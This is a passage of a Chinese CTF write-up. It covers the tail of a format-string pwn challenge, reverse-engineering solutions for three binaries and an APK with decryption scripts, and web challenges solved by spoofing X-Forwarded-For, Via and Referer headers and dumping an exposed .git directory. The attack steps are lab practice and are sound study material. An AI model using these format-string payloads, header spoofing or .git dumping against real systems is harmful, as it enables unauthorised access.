  你写的规则：[%3$08lx.%2$08lx.%2$08lx.%7$08lx.%%]
  打印结果：  [42424242.41414141.41414141.0000002a.%]
```

其中 `%%` 表示输出 字面量 `%`，其他的参考 Track 2 即可。

获取 flag：

```bash
输入 cat /flag 查看 flag
cat /flag
flag{ae7f3687-270c-9188-5a44-29657146d926}
```

## Reverse

### 提瓦特委托局·一：欢迎来到逆向世界

#### 分析

执行程序，看到输出如下，判断 flag 可能需要拼接出来：

```bat
> teyvat_commission_1.exe
Part1: search strings
Part2: two section names
Part3: export table hides tail
```

```c
_QWORD *sub_1400010A0()
{
  _QWORD *StackBase; // rsi
  _QWORD *StackBase_1; // rax
  int v2; // r14d
  _QWORD *v3; // rax
  __int64 i_2; // rcx
  _QWORD *Code; // rax
  Stream *Stream; // rax
  int v7; // esi
  char *v8; // rax
  __int16 n523; // dx
  __int64 i_1; // rbp
  _QWORD *v11; // rax
  _QWORD *v12; // r13
  __int64 v13; // r15
  __int64 i; // rsi
  size_t Size; // rdi
  _QWORD *v16; // rax
  unsigned int Code_1; // [rsp+3Ch] [rbp-5Ch]
  __int64 v18[9]; // [rsp+4Ch] [rbp-4Ch] BYREF

  StackBase = NtCurrentTeb()->NtTib.StackBase;
  while ( 1 )
  {
    StackBase_1 = (_QWORD *)_InterlockedCompareExchange64(&qword_140009040, (signed __int64)StackBase, 0);
    if ( !StackBase_1 )
    {
      v2 = 0;
      goto LABEL_6;
    }
    if ( StackBase == StackBase_1 )
      break;
    Sleep(dwMilliseconds: 0x3E8u);
  }
  v2 = 1;
LABEL_6:
  if ( n2 == 1 )
    sub_140002200(n31: 31);
  if ( n2 )
  {
    dword_140009004 = 1;
  }
  else
  {
    n2 = 1;
    Stream = _acrt_iob_func(Ix: 2u);
    setvbuf(Stream: Stream, Buffer: 0, Mode: 4, Size: 0);
    v7 = crt_atexit(Function: Function);
    if ( v7 )
      sub_140002200(n31: 26);
    sub_140001950();
    set_invalid_parameter_handler(Handler: Handler);
    sub_140001D40();
    if ( *(_WORD *)off_140004360 == 23117 )
    {
      v8 = (char *)off_140004360 + *((int *)off_140004360 + 15);
      if ( *(_DWORD *)v8 == 17744 )
      {
        n523 = *((_WORD *)v8 + 12);
        if ( n523 == 267 )
        {
          if ( *((_DWORD *)v8 + 29) > 0xEu )
            v7 = *((_DWORD *)v8 + 58) != 0;
        }
        else if ( n523 == 523 && *((_DWORD *)v8 + 33) > 0xEu )
        {
          v7 = *((_DWORD *)v8 + 62) != 0;
        }
      }
    }
    dword_140009008 = v7;
    if ( unk_140009080 )
      set_app_type(Type: _crt_gui_app);
    else
      set_app_type(Type: _crt_console_app);
    *_p__fmode() = unk_1400090B0;
    *_p__commode() = unk_140009070;
    if ( (int)sub_140001670() < 0 )
      goto LABEL_40;
    if ( unk_140003030 == 1 )
      sub_140001D30(sub_140001680: sub_140001680);
    if ( unk_140003020 == -1 )
      configthreadlocale(Flag: -1);
    if ( initterm_e(First: &First_, Last: Last_0) )
      sub_140002200(n31: 10);
    LODWORD(v18[0]) = unk_140009060;
    if ( (int)sub_140002230(
                p_i: (unsigned int)&::i,
                (unsigned int)&qword_140009018,
                (unsigned int)&qword_140009010,
                unk_140009050,
                (__int64)v18) < 0
      || (i_1 = ::i, v11 = malloc(Size: 8LL * (int)(::i + 1)), (v12 = v11) == 0) )
    {
LABEL_40:
      sub_140002200(n31: 8);
    }
    if ( (int)i_1 > 0 )
    {
      v13 = *(_QWORD *)&qword_140009018;
      for ( i = 1; ; ++i )
      {
        Size = strlen(Str: *(const char **)(v13 + 8 * i - 8)) + 1;
        v16 = malloc(Size: Size);
        v12[i - 1] = v16;
        if ( !v16 )
          goto LABEL_40;
        memcpy(v16, Src: *(const void **)(v13 + 8 * i - 8), Size: Size);
        if ( i_1 == i )
          break;
      }
      v11 = &v12[i_1];
    }
    *v11 = 0;
    *(_QWORD *)&qword_140009018 = v12;
    SetUnhandledExceptionFilter(lpTopLevelExceptionFilter: TopLevelExceptionFilter);
    initterm(First: &First__0, Last: &Last_);
    sub_1400015E0();
    crt_atexit(Function: sub_140001590);
    n2 = 2;
  }
  if ( !v2 )
    _InterlockedExchange64(&qword_140009040, 0);
  if ( qword_140009100 )
    qword_140009100(0, 2, 0);
  v3 = (_QWORD *)sub_1400021F0();
  i_2 = ::i;
  *v3 = *(_QWORD *)&qword_140009010;
  Code = (_QWORD *)sub_140001500(i: i_2);
  if ( !dword_140009008 )
    exit(Code: (int)Code);
  if ( !dword_140009004 )
  {
    Code_1 = (unsigned int)Code;
    cexit();
    return (_QWORD *)Code_1;
  }
  return Code;
}
```

如果对 MSVC 或者脱壳比较熟悉应该可以看出来这个函数是 `mainCRTStartup()`，其中 `sub_140001500()` 就是 `main()`。

修改一下名称，我们看到 main 函数如下：

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  sub_140001570(i: *(__int64 *)&argc);
  SetConsoleOutputCP(wCodePageID: 0xFDE9u);
  SetConsoleCP(wCodePageID: 0xFDE9u);
  puts(Buffer: "Part1: search strings");
  puts(Buffer: "Part2: two section names");
  puts(Buffer: "Part3: export table hides tail");
  if ( (unsigned int)wor1d__() == -1 )
    puts(Buffer: "unreachable");
  return 0;
}
```

#### Part 1

查找字符串可以注意到一个像 flag 的字符串 `lag{welcome`

```bash
.rdata:0000000140004068 66                 byte_140004068  db 'f'                  ; DATA XREF: _wor1d__+16↑r
.rdata:0000000140004069 6C 61 67 7B 77…    aLagWelcome     db 'lag{welcome',0
```

这里得到 flag 的第一部分 `flag{welcome`

#### Part 2

![](https://img.halfcity.top/2026/11/11/0235dbd40557964c15d0fae25a35be53.avif)

注意到两个名称特殊的段，这应该就是 flag 的第二部分，我们按照字符的逻辑拼接一下。

这样我们就得到了 flag 的第二部分 `_t0_reverse`

#### Part 3

![](https://img.halfcity.top/2026/11/11/ac128b32b420b97431dd725dcf1b644e.avif)

在导出表中可以找到另一个字符串 `_wor1d__`

但是我们可以注意到这里并没有 flag 的结尾，可是我们也无路可走了。

注意到 `Part3: export table hides tail` 这里提示了导出表的尾部似乎被隐藏了。

所以这类的 PE 头可能被魔改了，我们可以使用现有的网上的脚本恢复，也可以直接使用现代的 PE 浏览工具查看。

这些工具大多会手动解析导入表而不会听 PE 头中的描述。

这里我选择使用 `PE-bear`。

![](https://img.halfcity.top/2026/11/11/b68e5f691c5bbff2246924641fc73a02.avif)

可以看到这个工具正确解析的导出表并得到了最后的字符串 `_wor1d!}`

得到最后的 flag：

```txt
flag{welcome_t0_reverse_wor1d!}
```

### 曼波维修部·一：你先别急，让它跑一下

#### 分析

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  _BYTE v4[24]; // [rsp+0h] [rbp-20h] BYREF
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  puts_w(Duty_passphrase:: "Duty passphrase:");
  sub_1325("Duty passphrase:", a2);
  if ( (unsigned int)sub_1208(v4) && (unsigned int)sub_1526(v4) )
    puts_w(Duty_passphrase:: "Schedule accepted. You may leave on time.");
  else
    puts_w(Duty_passphrase:: "The cat stares at the invalid schedule.");
  return 0;
}
```

这是 main 函数。

```c
__int64 __fastcall sub_1325(char *Duty_passphrase:)
{
  int v1; // ecx
  __int64 j_1; // rax
  unsigned int v3; // [rsp+0h] [rbp-10h]
  unsigned int v4; // [rsp+0h] [rbp-10h]
  int i; // [rsp+4h] [rbp-Ch]
  int j; // [rsp+8h] [rbp-8h]

  v3 = 0xC0FFEE11;
  for ( i = 0; i <= 31; ++i )
  {
    v1 = v3 ^ (byte_2040[i] << (8 * (i & 3)));
    j_1 = v1 + (unsigned int)byte_2060[31 - i] - 1640531527;
    v3 = v1 + byte_2060[31 - i] - 1640531527;
  }
  for ( j = 0; j <= 23; ++j )
  {
    v4 = (((v3 << 13) ^ v3) >> 17) ^ (v3 << 13) ^ v3;
    v3 = (32 * v4) ^ v4;
    j_1 = j;
    byte_4020[j] = (61 * j)
                 ^ byte_2060[((_BYTE)j + (((unsigned __int8)v3 ^ (unsigned __int8)(11 * j)) & 0x1F) + 7) & 0x1F]
                 ^ byte_2040[((unsigned __int8)v3 ^ (unsigned __int8)(11 * j)) & 0x1F]
                 ^ (v3 >> (8 * (j & 3)));
  }
  return j_1;
}
```

这是一个 TEA 风格的加密函数，其中 `byte_4020` 是未初始化的全局变量，`byte_2060` 和 `byte_2040` 充当类似明文和 key 的角色将生成的初始化密钥赋值给 `byte_4020`。

换句话说这里没有处理输入，这里仅用于初始化 `byte_4020`，因此后面我们可以直接抄过来用。

```c
__int64 __fastcall sub_1208(void *dest)
{
  char s[8]; // [rsp+10h] [rbp-70h] BYREF
  __int64 v3; // [rsp+18h] [rbp-68h]
  __int64 v4; // [rsp+20h] [rbp-60h]
  __int64 v5; // [rsp+28h] [rbp-58h]
  __int64 v6; // [rsp+30h] [rbp-50h]
  __int64 v7; // [rsp+38h] [rbp-48h]
  __int64 v8; // [rsp+40h] [rbp-40h]
  __int64 v9; // [rsp+48h] [rbp-38h]
  __int64 v10; // [rsp+50h] [rbp-30h]
  __int64 v11; // [rsp+58h] [rbp-28h]
  __int64 v12; // [rsp+60h] [rbp-20h]
  __int64 v13; // [rsp+68h] [rbp-18h]
  unsigned __int64 v14; // [rsp+78h] [rbp-8h]

  v14 = __readfsqword(0x28u);
  *(_QWORD *)s = 0;
  v3 = 0;
  v4 = 0;
  v5 = 0;
  v6 = 0;
  v7 = 0;
  v8 = 0;
  v9 = 0;
  v10 = 0;
  v11 = 0;
  v12 = 0;
  v13 = 0;
  if ( (unsigned int)__isoc99_scanf("%95s", s) != 1 )
    return 0;
  if ( strlen(s: s) != 30 || memcmp(s1: s, s2: "flag{", n: 5u) || BYTE5(v5) != 125 )
    return 0;
  memcpy(dest: dest, src: &s[5], n: 0x18u);
  return 1;
}
```

这里开始提供输入，这个函数大致的逻辑是提供输出并提取输入 flag{...} 中间的内容 24 个字节。

```c
unsigned __int64 __fastcall sub_1441(__int64 a1, _BYTE *s1)
{
  unsigned __int8 v3; // [rsp+17h] [rbp-29h]
  int i; // [rsp+18h] [rbp-28h]
  int j; // [rsp+1Ch] [rbp-24h]
  _BYTE v6[24]; // [rsp+20h] [rbp-20h]
  unsigned __int64 v7; // [rsp+38h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  for ( i = 0; i <= 23; ++i )
  {
    v3 = *(_BYTE *)(i + a1) ^ byte_4020[i];
    v6[i] = (2 * v3) | (v3 >> 7);
  }
  for ( j = 0; j <= 23; ++j )
    s1[j] = v6[(j + 19) % 24];
  return v7 - __readfsqword(0x28u);
}
```

这里是一个 RC4 削弱版风格的加密。

其中 `v6[i] = (2 * v3) | (v3 >> 7);` 这里将 v3 左移一位并将 v3 原先的最高位 bit 放在第一位。

想还原也很简单，将原本被置换的位换回去就好了。

这里 `sub_1441()` 被 `sub_1526()` 调用并最后与密文 `s2_` 比对。

建议使用 LazyDump 这个插件来 dump 出数据。

我们接下来可以将写出解密脚本：

```c
#include <stdio.h>
#include <stdint.h>
#include <string.h>

unsigned char byte_2040[32] = {
    0x17, 0x29, 0x43, 0x61, 0x83, 0xA7, 0xC1, 0xE3, 0x35, 0x72, 0x19, 0xB4, 0x5D, 0x90, 0xEE, 0x08,
    0x6A, 0x2C, 0xF1, 0x47, 0x9B, 0xD0, 0x54, 0x7E, 0x11, 0x88, 0xCD, 0x3F, 0xA2, 0x65, 0x0B, 0xDA
};

unsigned char byte_2060[32] = {
    0x52, 0x31, 0x77, 0x18, 0xD2, 0x44, 0x9A, 0x0F, 0xBC, 0x26, 0x63, 0xE8, 0x05, 0x91, 0x4A, 0xD7,
    0x39, 0xAF, 0x10, 0x6C, 0xF5, 0x82, 0x2D, 0xC0, 0x74, 0x1B, 0x98, 0x56, 0xE1, 0x03, 0xBD, 0x49
};

unsigned char s2_[24] = {
    0xC1, 0x1E, 0x8D, 0x13, 0x20, 0x02, 0xBE, 0x07, 0x28, 0x02, 0xCD, 0xDC, 0xD7, 0x85, 0x38, 0x27,
    0x9C, 0x80, 0x01, 0x32, 0x73, 0x42, 0x90, 0xF5
};

unsigned char byte_4020[24] = { 0 };

__int64 init_key()
{
    int v1;          // ecx
    __int64 j_1;     // rax
    unsigned int v3; // [rsp+0h] [rbp-10h]
    unsigned int v4; // [rsp+0h] [rbp-10h]
    int i;           // [rsp+4h] [rbp-Ch]
    int j;           // [rsp+8h] [rbp-8h]

    v3 = -1056969199;
    for (i = 0; i <= 31; ++i)
    {
        v1 = v3 ^ (byte_2040[i] << (8 * (i & 3)));
        j_1 = v1 + (unsigned int)byte_2060[31 - i] - 1640531527;
        v3 = v1 + byte_2060[31 - i] - 1640531527;
    }
    for (j = 0; j <= 23; ++j)
    {
        v4 = (((v3 << 13) ^ v3) >> 17) ^ (v3 << 13) ^ v3;
        v3 = (32 * v4) ^ v4;
        j_1 = j;
        byte_4020[j] = (61 * j) ^ byte_2060[((uint8_t)j + (((unsigned __int8)v3 ^ (unsigned __int8)(11 * j)) & 0x1F) + 7) & 0x1F] ^ byte_2040[((unsigned __int8)v3 ^ (unsigned __int8)(11 * j)) & 0x1F] ^ (v3 >> (8 * (j & 3)));
    }
    return j_1;
}

int main()
{
    init_key();

    uint8_t flag[25] = { 0 };

    unsigned __int8 v3;  // [rsp+17h] [rbp-29h]
    uint8_t v6[24];      // [rsp+20h] [rbp-20h]

    // unsigned __int64 __fastcall encrypt(_BYTE * input, _BYTE * out)
    // {
    //     unsigned __int8 v3;  // [rsp+17h] [rbp-29h]
    //     int i;               // [rsp+18h] [rbp-28h]
    //     int j;               // [rsp+1Ch] [rbp-24h]
    //     _BYTE v6[24];        // [rsp+20h] [rbp-20h]
    //     unsigned __int64 v7; // [rsp+38h] [rbp-8h]
    //
    //     v7 = __readfsqword(0x28u);
    //     for (i = 0; i <= 23; ++i)
    //     {
    //         v3 = input[i] ^ byte_4020[i];
    //         v6[i] = (2 * v3) | (v3 >> 7);
    //     }
    //     for (j = 0; j <= 23; ++j)
    //         out[j] = v6[(j + 19) % 24];
    //     return v7 - __readfsqword(0x28u);
    // }

    for (uint8_t j = 0; j <= 23; ++j)
        v6[(j + 19) % 24] = s2_[j];

    for (uint8_t i = 0; i <= 23; ++i)
    {
        v3 = (v6[i] >> 1) | ((v6[i] & 1) << 7);
        flag[i] = v3 ^ byte_4020[i];
    }

    printf("[+] flag{%s}", flag);

    return 0;
}
```

输出如下：

```bat
> decrypt.exe
[+] flag{m4nb0_cat_runs_at_boot!!}
```

```txt
flag{m4nb0_cat_runs_at_boot!!}
```

### 银河售后中心·一：垃圾桶也要验证码？

#### 分析

```java
package org.galactic.aftercare.bin;

import android.os.Bundle;
import android.view.KeyEvent;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import java.io.IOException;

public final class MainActivity extends AppCompatActivity {
    private boolean accepted;
    private TextView statusText;
    private boolean submitted;
    private EditText tokenInput;
    private BinVerifier verifier;

    // 检测为 Lambda 实现
    private void lambda$onCreate$0(View view0) [...]

    // 检测为 Lambda 实现
    private boolean lambda$onCreate$1(TextView textView0, int v, KeyEvent keyEvent0) [...]

    @Override  // androidx.fragment.app.FragmentActivity
    protected void onCreate(Bundle bundle0) {
        super.onCreate(bundle0);
        this.setContentView(layout.activity_main);
        this.tokenInput = (EditText)this.findViewById(id.token_input);
        this.statusText = (TextView)this.findViewById(id.status_text);
        Button button0 = (Button)this.findViewById(id.open_button);
        try {
            this.verifier = new BinVerifier(this.getAssets());
        }
        catch(IOException unused_ex) {
            this.statusText.setText(string.resource_error);
            button0.setEnabled(false);
        }

        button0.setOnClickListener((View view0) -> this.submitToken());
        this.tokenInput.setOnEditorActionListener((TextView textView0, int v, KeyEvent keyEvent0) -> {
            if(v == 6) {
                this.submitToken();
                return true;
            }

            return false;
        });
        if(bundle0 != null && this.verifier != null) {
            this.submitted = bundle0.getBoolean("submitted", false);
            this.accepted = bundle0.getBoolean("accepted", false);
            if(this.submitted) {
                this.showResult();
            }
        }
    }

    @Override  // androidx.activity.ComponentActivity
    protected void onSaveInstanceState(Bundle bundle0) {
        bundle0.putBoolean("submitted", this.submitted);
        bundle0.putBoolean("accepted", this.accepted);
        super.onSaveInstanceState(bundle0);
    }

    private void showResult() {
        this.statusText.setText((this.accepted ? string.accepted : string.rejected));
        this.statusText.setTextColor(this.getColor((this.accepted ? color.success : color.error)));
    }

    private void submitToken() {
        BinVerifier binVerifier0 = this.verifier;
        if(binVerifier0 == null) {
            return;
        }

        this.accepted = binVerifier0.check(this.tokenInput.getText().toString());
        this.submitted = true;
        this.showResult();
    }
}
```

这是程序的 MainActivity。

注意这里调用了一个加密 Utils：

```java
private void submitToken() {
    BinVerifier binVerifier0 = this.verifier;
    if(binVerifier0 == null) {
        return;
    }

    this.accepted = binVerifier0.check(this.tokenInput.getText().toString());
    this.submitted = true;
    this.showResult();
}
```

我们来检查一下：

```java
package org.galactic.aftercare.bin;

import android.content.res.AssetManager;
import android.util.Base64;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;

public final class BinVerifier {
    private static final int BODY_LENGTH = 24;
    private static final String TARGET = "IVQHKgkWY1AdJRZJMEUAFAIRNEUcFBZY";
    private final byte[] mask;
    private final int[] order;

    public BinVerifier(AssetManager assetManager0) throws IOException {
        String[] arr_s = BinVerifier.readAsset(assetManager0, "sorting_order.txt").trim().split("\\s+");
        if(arr_s.length != 24) {
            throw new IOException("Invalid sorting table");
        }

        this.order = new int[24];
        boolean[] arr_z = new boolean[24];
        for(int v = 0; v < 24; ++v) {
            try {
                int v1 = Integer.parseInt(arr_s[v]);
                if(v1 < 0 || v1 >= 24 || arr_z[v1]) {
                    throw new IOException("Invalid sorting table");
                }

                arr_z[v1] = true;
                this.order[v] = v1;
            }
            catch(NumberFormatException numberFormatException0) {
                throw new IOException("Invalid sorting table", numberFormatException0);
            }
        }

        byte[] arr_b = BinVerifier.readAsset(assetManager0, "sorting_mask.txt").trim().getBytes(StandardCharsets.US_ASCII);
        this.mask = arr_b;
        if(arr_b.length == 0) {
            throw new IOException("Empty sorting mask");
        }
    }

    public boolean check(String s) {
        if(s != null && s.length() == 30 && s.startsWith("flag{") && s.endsWith("}")) {
            String s1 = s.substring(5, s.length() - 1);
            int v1 = 0;
            while(v1 < s1.length()) {
                if(s1.charAt(v1) >= 33 && s1.charAt(v1) <= 0x7E) {
                    ++v1;
                    continue;
                }

                return false;
            }

            byte[] arr_b = s1.getBytes(StandardCharsets.US_ASCII);
            byte[] arr_b1 = new byte[24];
            for(int v = 0; v < 24; ++v) {
                arr_b1[v] = (byte)(arr_b[this.order[v]] ^ this.mask[v % this.mask.length]);
            }

            return "IVQHKgkWY1AdJRZJMEUAFAIRNEUcFBZY".equals(Base64.encodeToString(arr_b1, 2));
        }

        return false;
    }

    private static String readAsset(AssetManager assetManager0, String s) throws IOException {
        StringBuilder stringBuilder0 = new StringBuilder();
        try(BufferedReader bufferedReader0 = new BufferedReader(new InputStreamReader(assetManager0.open(s), StandardCharsets.UTF_8))) {
            String s1;
            while((s1 = bufferedReader0.readLine()) != null) {
                stringBuilder0.append(s1);
                stringBuilder0.append('\n');
            }

            return stringBuilder0.toString();
        }
    }
}
```

这里在构造函数中初始化了 mask 和 order 的值并在 `check()` 中作为密钥。

而 `check()` 和上面一题类似同样是 RC4 风格削弱版加密。

我们需要构造加密实例的参数，读取 assets 中的 `sorting_mask.txt` 和 `sorting_order.txt` 我们可以得到我们需要的参数。

接下来直接解密即可：

```py
import base64

TARGET = "IVQHKgkWY1AdJRZJMEUAFAIRNEUcFBZY"
ORDER = [5, 12, 19, 2, 9, 16, 23, 6, 13, 20, 3, 10, 17, 0, 7, 14, 21, 4, 11, 18, 1, 8, 15, 22]
MASK = b"B1nKey"

enc = base64.b64decode(TARGET)
original = bytearray(24)

for v in range(24):
    original[ORDER[v]] = enc[v] ^ MASK[v % len(MASK)]

flag = "flag{" + original.decode("ascii") + "}"
print(flag)
```

```txt
flag{trashcan_l0ves_sorting!!}
```

### 阿萨拉下班指南·一：机密档案

#### 分析

观察到程序加壳：

![](https://img.halfcity.top/2026/11/11/045754e7b310a53b29cdbc3518bbafbe.avif)

先尝试使用脱壳机，如果不行手脱也很简单：

```bat
> upx -d D:\data\workspace\download\asara_escape_1.exe
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2023
UPX 4.1.0       Markus Oberhumer, Laszlo Molnar & John Reiser    Aug 8th 2023

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
     32768 <-      9216   28.13%    win64/pe     asara_escape_1.exe

Unpacked 1 file.
```

很好直接脱下来了，我们来分析函数的逻辑。

同上快速定位到 main 函数：

```c
Stream *__fastcall sub_1400016B0(__int64 i)
{
  Stream *Stream; // rax
  Stream *Stream_1; // rax
  unsigned int v3; // eax
  char Buffer[168]; // [rsp+20h] [rbp-A8h] BYREF

  sub_140001760(i: i);
  puts(Buffer: "Asara Escape 1: unpack the box first.");
  sub_140002380(Format: "evac credential> ");
  Stream = __acrt_iob_func(Ix: 1u);
  fflush(Stream: Stream);
  Stream_1 = __acrt_iob_func(Ix: 0);
  if ( fgets(Buffer: Buffer, MaxCount: 160, Stream: Stream_1) && (v3 = sub_1400014FF(Buffer: Buffer), (unsigned int)sub_14000167F(Buffer: Buffer, v3)) )
  {
    puts(Buffer: "evac request accepted");
    return 0;
  }
  else
  {
    puts(Buffer: "not accepted");
    return (Stream *)1;
  }
}
```

这里读取了 160 个字节的数据到缓冲区并传递给了 `sub_1400014FF()` 和 `sub_14000167F()` 这两个函数。

```c
size_t __fastcall sub_1400014FF(char *Buffer)
{
  size_t result; // rax
  char *v3; // rdx

  result = strlen(Str: Buffer);
  if ( (int)result > 0 )
  {
    v3 = &Buffer[(int)result - 1];
    do
    {
      if ( *v3 != 10 && *v3 != 13 )
        break;
      --v3;
      result = (unsigned int)(result - 1);
    }
    while ( (_DWORD)result );
  }
  return result;
}
```

这个函数是用于过滤末尾的字符的。

```c
int __fastcall sub_14000153C(unsigned __int8 *Buf1, int n30)
{
  int result; // eax
  unsigned __int8 *v3; // rbx

  if ( n30 != 30 )
    return 0;
  result = memcmp(Buf1: Buf1, Buf2: "flag{", Size: 5u);
  if ( result )
    return 0;
  if ( Buf1[29] == '}' )
  {
    v3 = Buf1 + 5;
    while ( 1 )
    {
      result = sub_1400014E0(*v3);
      if ( !result )
        break;
      if ( ++v3 == Buf1 + 29 )
        return 1;
    }
  }
  return result;
}
```

sub_14000153C() 这个函数似乎是校验 flag 合法性的。

```c
__int64 __fastcall sub_1400015A8(__int64 a1, __int64 a2)
{
  int n3; // ecx
  __int64 i; // rdx
  __int64 v6; // rbx
  __int64 v7; // r11
  __int64 result; // rax

  n3 = 3;
  for ( i = 0; i != 24; ++i )
  {
    v6 = n3 % 24;
    v7 = (int)i % 6;
    result = (unsigned int)i + (unsigned __int8)(byte_140004000[v7] ^ *(_BYTE *)(a1 + v6));
    *(_BYTE *)(a2 + i) = i + (byte_140004000[v7] ^ *(_BYTE *)(a1 + v6));
    n3 += 5;
  }
  return result;
}
```

这个应该就是加密的逻辑了，很简单，其中 `byte_140004000` 是密钥，简单还原一下：

```c
__int64 __fastcall encrypt(_BYTE *input, _BYTE *out)
{
  int factor; // ecx
  __int64 i; // rdx
  __int64 input_index; // rbx
  __int64 key_index; // r11
  __int64 result; // rax

  factor = 3;
  for ( i = 0; i != 24; ++i )
  {
    input_index = factor % 24;
    key_index = (int)i % 6;
    result = (unsigned int)i + (unsigned __int8)(byte_140004000[key_index] ^ input[input_index]);
    out[i] = i + (byte_140004000[key_index] ^ input[input_index]);
    factor += 5;
  }
  return result;
}
```

随后又调用了另一个函数，由于异或的特性相等输出 0 ，因此这里是判断是否逐字节都相等：

```c
_BOOL8 __fastcall sub_140001629(_BYTE *buf)
{
  char v1; // r8
  __int64 i; // rax

  v1 = aAaaaaaaaaaaaaa[0] ^ 0x41;
  for ( i = 0; i != 24; ++i )
    v1 |= byte_140004010[i] ^ buf[i];
  return v1 == 0;
}
```

这里的 v1 就是标识符。

我们可以轻松找到两个密钥：

```bash
.rdata:0000000140004000 39 17 5C 23 71     byte_140004000  db 39h, 17h, 5Ch, 23h, 71h, 0Eh, 0Ah dup(0)
.rdata:0000000140004000 0E 00 00 00 00…                                            ; DATA XREF: sub_1400015A8+11↑o
.rdata:0000000140004010                    ; _BYTE byte_140004010[80]
.rdata:0000000140004010 66 49 3B 4F 44     byte_140004010  db 66h, 49h, 3Bh, 4Fh, 44h, 6Dh, 52h, 68h, 3Fh, 5Ah, 4Ah
.rdata:0000000140004010 6D 52 68 3F 5A…                                            ; DATA XREF: sub_140001629+11↑o
.rdata:000000014000401B 89 64 32 47 5E…                    db 89h, 64h, 32h, 47h, 5Eh, 19h, 7Eh, 21h, 86h, 4Dh, 91h
.rdata:0000000140004026 44 55 00 00 00…                    db 44h, 55h, 8 dup(0), 61h, 73h, 61h, 72h, 61h, 20h, 65h
.rdata:0000000140004037 76 61 63 20 72…                    db 76h, 61h, 63h, 20h, 72h, 65h, 63h, 65h, 69h, 70h, 74h
.rdata:0000000140004042 00 00 00 00 00…                    db 1Eh dup(0)
```

我们还是使用 LazyDump 导出密钥。

加密函数的逻辑是正向线性加密，我们正向解密即可。

解密脚本如下：

```c
#include <stdio.h>
#include <stdint.h>
#include <string.h>

unsigned char byte_140004000[16] = {
    0x39, 0x17, 0x5C, 0x23, 0x71, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

unsigned char byte_140004010[80] = {
    0x66, 0x49, 0x3B, 0x4F, 0x44, 0x6D, 0x52, 0x68, 0x3F, 0x5A, 0x4A, 0x89, 0x64, 0x32, 0x47, 0x5E,
    0x19, 0x7E, 0x21, 0x86, 0x4D, 0x91, 0x44, 0x55, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x61, 0x73, 0x61, 0x72, 0x61, 0x20, 0x65, 0x76, 0x61, 0x63, 0x20, 0x72, 0x65, 0x63, 0x65, 0x69,
    0x70, 0x74, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

int main()
{
    // __int64 __fastcall encrypt(_BYTE * input, _BYTE * out)
    // {
    //     int factor;          // ecx
    //     __int64 i;           // rdx
    //     __int64 input_index; // rbx
    //     __int64 key_index;   // r11
    //     __int64 result;      // rax

    //     factor = 3;
    //     for (i = 0; i != 24; ++i)
    //     {
    //         input_index = factor % 24;
    //         key_index = (int)i % 6;
    //         result = (unsigned int)i + (unsigned __int8)(byte_140004000[key_index] ^ input[input_index]);
    //         out[i] = i + (byte_140004000[key_index] ^ input[input_index]);
    //         factor += 5;
    //     }
    //     return result;
    // }

    uint8_t flag[25] = { 0 };

    uint8_t factor = 3;
    for (uint8_t i = 0; i < 24; i++)
    {
        uint8_t input_index = factor % 24;
        uint8_t key_index = i % 6;
        flag[input_index] = (byte_140004010[i] - i) ^ byte_140004000[key_index];
        factor += 5;
    }

    printf("[+] flag{%s}", flag);

    return 0;
    
}
```

输出如下:

```bat
> decrypt.exe
[+] flag{red_f1le_upx_evac_ok2601}
```

```txt
flag{red_f1le_upx_evac_ok2601}
```

## Web

### FLAG 怪盗团·一

功利一点，直接进入试炼：

#### Track 1

![](https://img.halfcity.top/2026/11/11/5d07cf7bb5958b64e2f2709385613d59.avif)

```txt
【试炼 01】：向 /api/challenge/handshake 发送 POST 请求，请求正文包含 codename=JOKER。
```

简单的握手，直接使用 curl 请求：

```bash
❯ curl -X POST http://110.42.112.160:47630/api/challenge/handshake --data "codename=JOKER"
{"message":"握手完成，回到聊天窗口吧！","ok":true}
```

#### Track 2

![](https://img.halfcity.top/2026/11/11/01603f68bef144f5974539fa3eebc59c.avif)

```txt
【试炼 02】：请求 /api/challenge/trust，伪造用于标识客户端的真实 IP 地址的请求头为本地回环地址。
```

可以尝试添加一个 `X-Forwarded-For` 头：

```bash
❯ curl -X POST http://110.42.112.160:47630/api/challenge/trust --header "X-Forwarded-For: 127.0.0.1"
{"message":"验证通过，回到聊天窗口吧！","ok":true,"stage":2}
```

#### Track 3

![](https://img.halfcity.top/2026/11/11/b1090b27ab4d72738c57235162ea81e9.avif)

```txt
【试炼 03】：请求 /api/challenge/trust，添加表示代理服务器的请求头，内容为 phantom-proxy。
```

#### Track 4

![](https://img.halfcity.top/2026/11/11/4385adbb0cf38bc31398d1de315b531f.avif)

```bash
❯ curl -X POST http://110.42.112.160:47630/api/challenge/trust --header "Via: phantom-proxy"
{"message":"验证通过，回到聊天窗口吧！","ok":true,"stage":3}
```

#### Track 5

![](https://img.halfcity.top/2026/11/11/336fa7b691a9b32cc61765c57e142704.avif)

```bash
❯ curl -X POST http://110.42.112.160:47630/api/challenge/trust --header "Referer: https://mementos.local/"
{"message":"验证通过，回到聊天窗口吧！","ok":true,"stage":4}
```

#### Track 6

![](https://img.halfcity.top/2026/11/11/f048cc509fd47e5d17d0a8e17fef2b8d.avif)

我们进入到了这个网址 `http://110.42.112.160:47630/medjed/`。

我们根据提示 dumper 泄露的 .git：

```bash
❯ git-dumper http://110.42.112.160:37583/medjed/ .
Warning: Destination '.' is not empty
[-] Testing http://110.42.112.160:37583/medjed/.git/HEAD [200]
[-] Testing http://110.42.112.160:37583/medjed/.git/ [404]
[-] Fetching common files
